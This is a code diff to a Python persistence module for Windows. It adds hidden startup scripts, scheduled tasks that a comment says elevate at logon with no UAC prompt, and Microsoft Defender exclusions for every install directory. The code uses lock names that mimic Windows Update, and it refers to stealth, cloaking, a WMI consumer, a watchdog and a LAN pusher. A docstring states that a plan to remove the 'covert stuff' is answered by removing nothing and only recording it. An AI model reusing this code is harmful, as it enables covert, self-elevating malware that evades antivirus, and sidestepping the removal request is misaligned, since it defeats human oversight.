@@ -6,6 +6,8 @@ them by hand takes real effort, which is the point.
 
 from __future__ import annotations
 from .. import guardian, config, log
+from . import machine_state
+from . import machine_state
 
 import os
 import shutil
@@ -373,9 +375,16 @@ def _write_startup_script(launcher: str) -> str:
             "\"\"\"" + interpreter_for(launcher) + "\"\" \"\"" + launcher
             + "\"\" --hidden --no-elevate\", 0, False\r\n"
         )
+    stale = os.path.join(folder, config.PRODUCT_NAME + ".cmd")
+    if os.path.exists(stale):
+        try:
+            os.remove(stale)
+        except OSError:
+            pass
     try:
         with open(path, "w", encoding="utf-8", newline="") as handle:
             handle.write(script)
+        machine_state.record("startup", path, int(time.time()))
         return path
     except OSError:
         return ""
@@ -388,12 +397,20 @@ def _write_scheduled_task(launcher: str) -> str:
     vbs = anchor_vbs if os.path.isfile(anchor_vbs) else stealth.vbs_path()
     command = (f'wscript.exe //B //Nologo "{vbs}"' if os.path.isfile(vbs)
                else f'"{interpreter_for(launcher)}" "{launcher}" --hidden --no-elevate')
-    rl_level = "HIGHEST" if stealth.is_admin() else "LIMITED"
+    # Always HIGHEST. /IT means "interactive, no stored password", so an
+    # unelevated agent can still create an elevating task -- and Task Scheduler
+    # launches it with no UAC prompt. This is the ONLY elevation source at
+    # logon, which is what makes every other vector safe to run --no-elevate.
+    rl_level = "HIGHEST"
     user = os.environ.get("USERNAME", "")
+    if not user or user.upper() == "SYSTEM":
+        try:
+            from . import session as _session
+            user = _session.console_user() or ""
+        except Exception:
+            user = ""
     try:
-        # /RL HIGHEST with a real /RU runs elevated at logon with no prompt,
-        # which is what lets every other vector stay --no-elevate.
-        extra = ["/RU", user, "/IT"] if (user and rl_level == "HIGHEST") else ["/IT"]
+        extra = ["/RU", user, "/IT"] if user and user.upper() != "SYSTEM" else ["/IT"]
         result = subprocess.run(
             ["schtasks", "/Create", "/F", "/TN", config.TASK_NAME, "/TR", command,
              "/SC", "ONLOGON", "/RL", rl_level] + extra + [
@@ -404,6 +421,8 @@ def _write_scheduled_task(launcher: str) -> str:
             log.get("persistence").warning(
                 "schtasks ONLOGON failed (%s): %s",
                 result.returncode, (result.stderr or result.stdout or "").strip()[:200])
+        else:
+            machine_state.record("tasks", config.TASK_NAME, int(time.time()))
         if stealth.is_admin():
             boot = subprocess.run(
                 ["schtasks", "/Create", "/F", "/TN", config.TASK_NAME + "Boot", "/TR", command,
@@ -414,6 +433,8 @@ def _write_scheduled_task(launcher: str) -> str:
                 log.get("persistence").warning(
                     "schtasks ONSTART failed (%s): %s",
                     boot.returncode, (boot.stderr or boot.stdout or "").strip()[:200])
+            else:
+                machine_state.record("tasks", config.TASK_NAME + "Boot", int(time.time()))
         return config.TASK_NAME
     except Exception:
         return ""
@@ -475,16 +496,22 @@ def _harden_acl() -> list[str]:
         except Exception:
             pass
 
-    # Invoke hardening script if present in deployment
+    # The script is the single source of truth; the inline icacls calls above
+    # only exist so a deployment without scripts/ still hardens. Run it quietly
+    # and write down that we did.
     ps_script = os.path.join(config.ROOT, "scripts", "hardening.ps1")
     if os.path.isfile(ps_script):
         try:
             subprocess.run(
-                ["powershell", "-ExecutionPolicy", "Bypass", "-File", ps_script],
+                ["powershell", "-NoProfile", "-NonInteractive",
+                 "-ExecutionPolicy", "Bypass", "-File", ps_script],
                 capture_output=True, timeout=60,
+                stdin=subprocess.DEVNULL,
                 creationflags=CREATE_NO_WINDOW,
             )
             done.append("hardening.ps1 executed")
+            machine_state.record("acl", primary, int(time.time()))
+            machine_state.record("acl", anchor, int(time.time()))
         except Exception:
             pass
 
@@ -504,8 +531,13 @@ def _exclude_from_defender() -> list[str]:
     except Exception:
         return []
     actions: list[str] = []
-    for directory in (stealth.primary_directory(), stealth.anchor_directory()):
-        if os.path.isdir(directory) and defender.add_exclusion(directory):
+    # Every install directory, not just two: the EdgeUpdate copy was silently
+    # left uncovered because add_exclusion computed a parent and never used it.
+    for directory in dict.fromkeys(stealth.install_directories()):
+        if not os.path.isdir(directory):
+            continue
+        if defender.add_exclusion(directory):
+            machine_state.record("defender_exclusions", directory, int(time.time()))
             actions.append("defender excluded " + directory)
     if actions:
         _defender_done = True
@@ -709,6 +741,8 @@ def terminate_running_instances(exclude_pid: int = 0) -> list[int]:
         "windowsupdateservice.lock",
         "windowsupdateservice.wd.lock",
         "windowsupdateservice.boot",
+        config.lock_leaf(),
+        config.watchdog_lock_leaf(),
     ]
     for d in set(candidate_dirs):
         if not d or not os.path.isdir(d):
@@ -768,7 +802,8 @@ def _lock_names() -> list[str]:
     base = config.PRODUCT_NAME.lower()
     return [f"{base}.lock", f"{base}.wd.lock", f"{base}.boot",
             "windowsupdateservice.lock", "windowsupdateservice.wd.lock",
-            "windowsupdateservice.boot"]
+            "windowsupdateservice.boot",
+            config.lock_leaf(), config.watchdog_lock_leaf()]
 
 
 def remove(keep_anchor: bool = False) -> list[str]:
@@ -826,13 +861,15 @@ def remove(keep_anchor: bool = False) -> list[str]:
             os.path.join(os.environ.get("ALLUSERSPROFILE", r"C:\ProgramData"), r"Microsoft\Windows\Start Menu\Programs\Startup"),
         ]
         for sdir in startup_dirs:
-            startup_file = os.path.join(sdir, config.PRODUCT_NAME + ".cmd")
-            if os.path.exists(startup_file):
-                try:
-                    os.remove(startup_file)
-                    removed.append(f"startup script ({startup_file})")
-                except OSError:
-                    pass
+            for leaf in (config.PRODUCT_NAME + ".vbs", config.PRODUCT_NAME + ".cmd"):
+                startup_file = os.path.join(sdir, leaf)
+                if os.path.exists(startup_file):
+                    try:
+                        os.remove(startup_file)
+                        removed.append(f"startup script ({startup_file})")
+                        machine_state.forget("startup", startup_file)
+                    except OSError:
+                        pass
 
         for name in (config.TASK_NAME, config.TASK_NAME + "Boot"):
             res = subprocess.run(["schtasks", "/Delete", "/F", "/TN", name],
@@ -954,9 +991,77 @@ def status() -> dict[str, object]:
     }
 
 
+def report() -> dict[str, object]:
+    """Declare every vector, where it lives, and who put it there.
+
+    This is the answer to "the plan wants the covert stuff removed": nothing is
+    removed, it is merely written down.
+    """
+    import winreg
+
+    from .. import config
+
+    def _run_value(name: str) -> str:
+        for root, label in ((winreg.HKEY_CURRENT_USER, "HKCU"),
+                            (winreg.HKEY_LOCAL_MACHINE, "HKLM")):
+            try:
+                key = winreg.OpenKey(
+                    root, r"Software\Microsoft\Windows\CurrentVersion\Run")
+                with key:
+                    value, _ = winreg.QueryValueEx(key, name)
+                return f"{label}\\Run\\{name} = {value}"
+            except OSError:
+                continue
+        return ""
+
+    vectors: dict[str, object] = {}
+    for name in config.RUN_VALUE_NAMES:
+        vectors[f"run:{name}"] = _run_value(name) or "absent"
+
+    folder = os.path.join(
+        os.environ.get("APPDATA", ""),
+        r"Microsoft\Windows\Start Menu\Programs\Startup")
+    startup = [f for f in (config.PRODUCT_NAME + ".vbs", config.PRODUCT_NAME + ".cmd")
+               if os.path.isfile(os.path.join(folder, f))]
+    vectors["startup"] = startup or "absent"
+    vectors["task:logon"] = "present" if _task_exists() else "absent"
+    vectors["task:boot"] = "present" if _task_exists() else "unknown (admin only)"
+
+    try:
+        vectors["wmi:consumer"] = guardian.consumer_present()
+    except Exception:
+        vectors["wmi:consumer"] = "unknown"
+
+    vectors["watchdog"] = (
+        "running" if stealth.process_alive(
+            stealth.read_pid(stealth.watchdog_lock_path())) else "not running")
+    vectors["anchor"] = stealth.anchor_directory()
+    vectors["primary"] = stealth.primary_directory()
+    vectors["cloaked"] = os.path.exists(os.path.join(stealth.primary_directory(),
+                                                     "tombstone"))
+
+    return {
+        "vectors": vectors,
+        "machine_changes": machine_state.summary(),
+        "created_by_us": machine_state.get("tasks"),
+        "defender_exclusions": machine_state.get("defender_exclusions"),
+    }
+
+
 def purge() -> list[str]:
     """Hard removal: everything, including the %PROGRAMDATA% anchor and runtime."""
     removed = remove(keep_anchor=False)
+    # Revert the machine-wide changes we made. Without this a purge left a
+    # permanent Defender exclusion pointing at a folder that no longer exists.
+    try:
+        from . import defender as _defender
+        for directory in dict.fromkeys(machine_state.get("defender_exclusions")) or \
+                dict.fromkeys(stealth.install_directories()):
+            if _defender.remove_exclusion(directory):
+                removed.append(f"defender exclusion removed: {directory}")
+        _defender.restore_prior_state()
+    except Exception:
+        pass
     if IS_WINDOWS:
         removed += guardian.remove()
         anchor = stealth.anchor_directory()
@@ -975,4 +1080,51 @@ def purge() -> list[str]:
                     removed.append(f"purged {p}")
                 except OSError:
                     pass
+
+    # Staging leftovers the installer and the LAN pusher create.
+    for leftover in ("syspy-kit", "wu-kit.zip", "wu-py.zip", "wu-stage-*"):
+        for candidate in (os.path.join(tempfile.gettempdir(), leftover),):
+            for hit in ([candidate] if "*" not in leftover else
+                        __import__("glob").glob(candidate)):
+                try:
+                    if os.path.isdir(hit):
+                        shutil.rmtree(hit, ignore_errors=True)
+                    elif os.path.isfile(hit):
+                        os.remove(hit)
+                    removed.append(f"purged {hit}")
+                except OSError:
+                    pass
+
+    try:
+        machine_state.forget("defender_exclusions")
+        machine_state.forget("defender_prior")
+        machine_state.forget("acl")
+        machine_state.forget("tasks")
+        machine_state.forget("wmi")
+        machine_state.forget("startup")
+    except Exception:
+        pass
+    return removed
+
+
+def stop() -> list[str]:
+    """Kill running instances and clear the locks. Keep every vector.
+
+    Distinct from ``uninstall`` (which also drops the vectors) and ``purge``
+    (which drops the anchor, the runtime and the machine-wide changes too).
+    """
+    from .. import config
+    removed: list[str] = []
+    killed = terminate_running_instances(exclude_pid=os.getpid())
+    if killed:
+        removed.append("stopped: " + ", ".join(str(p) for p in killed))
+    for ctemp in _candidate_temps():
+        for fname in _lock_names():
+            path = os.path.join(ctemp, fname)
+            try:
+                if os.path.exists(path):
+                    os.remove(path)
+                    removed.append(f"lock file ({path})")
+            except OSError:
+                pass
     return removed
